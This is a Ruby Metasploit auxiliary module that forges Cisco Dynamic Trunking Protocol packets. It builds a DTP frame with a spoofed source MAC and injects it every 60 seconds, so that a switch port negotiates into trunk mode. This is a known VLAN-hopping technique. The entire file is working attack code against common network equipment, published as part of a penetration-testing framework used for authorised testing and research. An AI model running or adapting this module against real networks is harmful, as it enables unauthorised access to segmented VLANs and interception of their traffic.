##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Capture

  def initialize(info = {})
    super(
      'Name'        => 'Forge Cisco DTP Packets',
      'Description'	=> %q{
        This module forges DTP packets to initialize a trunk port.
      },
      'Author'		=> [ 'Spencer McIntyre' ],
      'License'		=> MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' => [ 'Service' ],
      'DefaultAction'  => 'Service'
    )
    register_options(
      [
        OptString.new('SMAC',    	[false, 'The spoofed mac (if unset, derived from netifaces)']),
      ], self.class)
    deregister_options('RHOST', 'PCAPFILE')
  end

  def build_dtp_frame
    p = PacketFu::EthPacket.new
    p.eth_daddr = '01:00:0c:cc:cc:cc'
    p.eth_saddr = smac
    llc_hdr =	"\xaa\xaa\x03\x00\x00\x0c\x20\x04"
    dtp_hdr =	"\x01"															# version
    dtp_hdr <<	"\x00\x01\x00\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x00"			# domain
    dtp_hdr <<	"\x00\x02\x00\x05\x03"											# status
    dtp_hdr <<	"\x00\x03\x00\x05\x45"											# dtp type
    dtp_hdr <<	"\x00\x04\x00\x0a" << PacketFu::EthHeader.mac2str(smac)			# neighbor
    p.eth_proto = llc_hdr.length + dtp_hdr.length
    p.payload = llc_hdr << dtp_hdr
    p
  end

  def is_mac?(mac)
    !!(mac =~ /^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$/)
  end

  def smac
    @spoof_mac ||= datastore['SMAC']
    @spoof_mac ||= get_mac(datastore['INTERFACE']) if netifaces_implemented?
    return @spoof_mac
  end

  def run
    unless smac()
      print_error 'Source MAC (SMAC) should be defined'
    else
      unless is_mac? smac
        print_error "Source MAC (SMAC) `#{smac}' is badly formatted."
      else
        print_status "Starting DTP spoofing service..."
        open_pcap({'FILTER' => "ether host 01:00:0c:cc:cc:cc"})
        interface = datastore['INTERFACE'] || Pcap.lookupdev
        dtp = build_dtp_frame()
        @run = true
        while @run
          capture.inject(dtp.to_s)
          select(nil, nil, nil, 60)
        end
        close_pcap
      end
    end
  end

end
